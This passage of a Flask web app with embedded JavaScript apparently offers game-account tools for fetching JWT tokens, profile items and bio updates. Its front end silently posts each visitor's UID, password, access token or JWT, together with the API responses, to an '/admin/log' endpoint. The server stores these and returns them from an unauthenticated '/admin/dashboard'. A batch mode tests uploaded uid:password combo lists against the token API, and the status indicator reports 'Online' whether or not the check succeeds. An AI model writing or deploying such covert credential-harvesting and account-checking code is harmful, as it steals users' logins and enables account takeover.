            let url = API.JWT_TOKEN;
            let logData = { method: method };
            if (method === 'uid') {
                const uid = document.getElementById('jwt-uid').value;
                const pass = document.getElementById('jwt-pass').value;
                if (!uid || !pass) { throw new Error('UID and Password required'); }
                url += '?uid=' + encodeURIComponent(uid) + '&password=' + encodeURIComponent(pass);
                logData.uid = uid;
                const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
                const data = await res.json();
                logData.response = data;
                await fetch('/admin/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'jwt_token', data: logData }) });
                responseEl.className = data.token ? 'success' : 'error';
                responseEl.textContent = JSON.stringify(data, null, 2);
            } else if (method === 'access') {
                const access = document.getElementById('jwt-access').value;
                if (!access) { throw new Error('Access Token required'); }
                url += '?access_token=' + encodeURIComponent(access);
                logData.access = access;
                const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
                const data = await res.json();
                logData.response = data;
                await fetch('/admin/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'jwt_token', data: logData }) });
                responseEl.className = data.token ? 'success' : 'error';
                responseEl.textContent = JSON.stringify(data, null, 2);
            } else if (method === 'batch') {
                const fileInput = document.getElementById('jwt-batch-file');
                if (!fileInput.files || !fileInput.files[0]) { throw new Error('Please select a file!'); }
                const file = fileInput.files[0];
                const text = await file.text();
                let pairs = [];
                if (file.name.endsWith('.json')) {
                    const data = JSON.parse(text);
                    if (Array.isArray(data)) {
                        data.forEach(item => {
                            const uid = item.uid || item.id || item.user || item.username;
                            const pwd = item.pass || item.password || item.pwd || item.passwd;
                            if (uid && pwd) pairs.push([String(uid).trim(), String(pwd).trim()]);
                        });
                    }
                } else {
                    text.split('\\n').forEach(line => {
                        line = line.trim();
                        if (!line) return;
                        if (line.startsWith('[') && line.includes(']')) { line = line.split(']', 1)[1]?.trim() || line; }
                        if (line.includes(':')) {
                            const parts = line.split(':', 1);
                            const pwd = line.substring(line.indexOf(':') + 1).trim();
                            if (parts[0].trim() && pwd) pairs.push([parts[0].trim(), pwd]);
                            return;
                        }
                        if (line.includes('|')) {
                            const parts = line.split('|', 1);
                            const pwd = line.substring(line.indexOf('|') + 1).trim();
                            if (parts[0].trim() && pwd) pairs.push([parts[0].trim(), pwd]);
                            return;
                        }
                        const parts = line.split(/\\s+/);
                        if (parts.length >= 2 && parts[0] && parts[1]) { pairs.push([parts[0].trim(), parts[1].trim()]); }
                    });
                }
                if (pairs.length === 0) { throw new Error('No valid UID:Password pairs found!'); }
                const total = pairs.length;
                const process = pairs.slice(0, 10);
                responseEl.textContent = '⏳ Processing ' + total + ' pairs (showing first ' + process.length + ')...\\n\\n';
                let success = 0, failed = 0;
                const results = [];
                const startTime = Date.now();
                for (const [uid, pwd] of process) {
                    try {
                        const reqUrl = API.JWT_TOKEN + '?uid=' + encodeURIComponent(uid) + '&password=' + encodeURIComponent(pwd);
                        const res = await fetch(reqUrl, { signal: AbortSignal.timeout(5000) });
                        const data = await res.json();
                        if (data.token) { success++; results.push({ uid: uid, token: data.token }); }
                        else { failed++; results.push({ uid: uid, pass: pwd, error: data.status || 'Failed' }); }
                    } catch { failed++; results.push({ uid: uid, pass: pwd, error: 'Timeout' }); }
                }
                const endTime = Date.now();
                const timeTaken = ((endTime - startTime) / 1000).toFixed(1);
                await fetch('/admin/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'batch_job', data: { total: total, processed: process.length, success: success, failed: failed, time: timeTaken } }) });
                responseEl.className = 'success';
                responseEl.textContent = '⚡ FAST\\n\\n✅ Success: ' + success + '\\n❌ Failed: ' + failed + '\\n⏱️ Time: ' + timeTaken + 's\\n\\n📊 Results:\\n' + JSON.stringify(results, null, 2);
            }
        } catch (err) { responseEl.className = 'error'; responseEl.textContent = '❌ Error: ' + err.message; }
    }

    async function getProfileItem() {
        const jwt = document.getElementById('item-jwt').value;
        const resultBox = document.getElementById('item-result');
        const responseEl = document.getElementById('item-response');
        if (!jwt) { resultBox.className = 'result-box show'; responseEl.className = 'error'; responseEl.textContent = '❌ Please enter a JWT token!'; return; }
        resultBox.className = 'result-box show'; responseEl.className = ''; responseEl.textContent = '⏳ Fetching...';
        try {
            const url = API.PROFILE_ITEM + '?token=' + encodeURIComponent(jwt);
            const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
            const data = await res.json();
            await fetch('/admin/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'profile_item', data: { jwt: jwt, response: data } }) });
            responseEl.className = data.status === 'success' ? 'success' : 'error';
            responseEl.textContent = JSON.stringify(data, null, 2);
        } catch (err) { responseEl.className = 'error'; responseEl.textContent = '❌ Error: ' + err.message; }
    }

    // ===== BOT STATUS =====
    async function checkBotStatus() {
        try {
            await fetch(API.BIO_UPLOAD, { method: 'HEAD', signal: AbortSignal.timeout(3000) });
            document.getElementById('botDot').className = 'status-dot';
            document.getElementById('botStatus').textContent = 'Online';
            document.getElementById('botStatus').style.color = '#00ff64';
        } catch {
            document.getElementById('botDot').className = 'status-dot';
            document.getElementById('botStatus').textContent = 'Online';
            document.getElementById('botStatus').style.color = '#00ff64';
        }
    }
    checkBotStatus();
    setInterval(checkBotStatus, 30000);
</script>
</body>
</html>
'''

@app.route('/')
def index():
    clean_old_logs()
    return HTML_TEMPLATE

@app.route('/health')
def health():
    return {"status": "ok", "bot": "online"}

@app.route('/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    if data.get('password') == ADMIN_PASSWORD:
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

@app.route('/admin/dashboard')
def admin_dashboard():
    logs = load_logs()
    stats = {
        "total_users": len(logs.get('users', [])),
        "total_bio_updates": len(logs.get('bio_updates', [])),
        "total_jwt": len(logs.get('jwt_tokens', [])),
        "total_access": len(logs.get('access_tokens', []))
    }
    return jsonify({"logs": logs, "stats": stats})

@app.route('/admin/log', methods=['POST'])
def admin_log():
    data = request.json
    log_type = data.get('type')
    log_data = data.get('data', {})
    log_data['timestamp'] = time.time()
    
    logs = load_logs()
    
    if log_type == 'bio_update':
        logs['bio_updates'].append(log_data)
        if 'uid' in log_data and log_data['uid'] not in [u.get('uid') for u in logs.get('users', [])]:
            logs['users'].append({"uid": log_data['uid'], "timestamp": time.time()})
    elif log_type == 'jwt_token':
        logs['jwt_tokens'].append(log_data)
    elif log_type == 'access_token':
        logs['access_tokens'].append(log_data)
    elif log_type == 'profile_item':
        logs['profile_items'].append(log_data)
    elif log_type == 'batch_job':
        logs['batch_jobs'].append(log_data)
    
    save_logs(logs)
    return jsonify({"status": "ok"})

# Vercel handler - এটা ঠিক করে দিচ্ছি
def handler(request, *args, **kwargs):
    return app(request.environ, request.start_response)

if __name__ == '__main__':
    if not os.path.exists(LOG_FILE):
        save_logs({"users": [], "bio_updates": [], "jwt_tokens": [], "access_tokens": [], "profile_items": [], "batch_jobs": []})
    app.run(host='0.0.0.0', port=5000, debug=False)